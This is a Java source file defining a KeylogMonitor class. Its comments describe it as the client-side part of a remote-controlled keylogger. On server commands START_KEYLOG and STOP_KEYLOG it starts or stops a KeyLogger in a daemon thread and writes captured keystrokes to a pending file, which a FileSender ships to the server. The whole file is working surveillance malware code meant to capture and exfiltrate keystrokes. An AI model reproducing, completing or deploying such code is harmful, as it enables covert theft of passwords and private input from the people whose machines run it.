package com.acs;

/**
 * Client-side wrapper that owns the KeyLogger and routes all captured
 * keystrokes through ClientLogger (persistent .pending file) instead of
 * directly to sendQueue. FileSender picks it up from there and sends to server.
 *
 * Usage:
 *   KeylogMonitor monitor = new KeylogMonitor();
 *   monitor.start();   // called when server sends START_KEYLOG
 *   monitor.stop();    // called when server sends STOP_KEYLOG
 */
public class KeylogMonitor {

    private volatile KeyLogger keyLogger = null;
    private volatile boolean   running   = false;

    public KeylogMonitor() {}

    // ── Public API ────────────────────────────────────────────────────────────

    public void start() {
        if (running) {
            System.out.println("[KeylogMonitor] Already running — ignoring duplicate START");
            return;
        }

        running   = true;
        keyLogger = new KeyLogger(data -> ClientLogger.write("keylog", data));

        Thread t = new Thread(() -> {
            System.out.println("[KeylogMonitor] Starting KeyLogger");
            try {
                keyLogger.start();
                synchronized (this) {
                    while (running) wait();
                }
            } catch (Exception e) {
                System.err.println("[KeylogMonitor] Error: " + e.getMessage());
            } finally {
                running = false;
                System.out.println("[KeylogMonitor] Logger stopped");
            }
        }, "KeylogStarter");
        t.setDaemon(true);
        t.start();
    }

    public void stop() {
        if (!running) return;
        running = false;

        if (keyLogger != null) {
            keyLogger.stop();
            keyLogger = null;
        }

        synchronized (this) { notifyAll(); }
        System.out.println("[KeylogMonitor] Stop requested");
    }

    public boolean isRunning() { return running; }
}
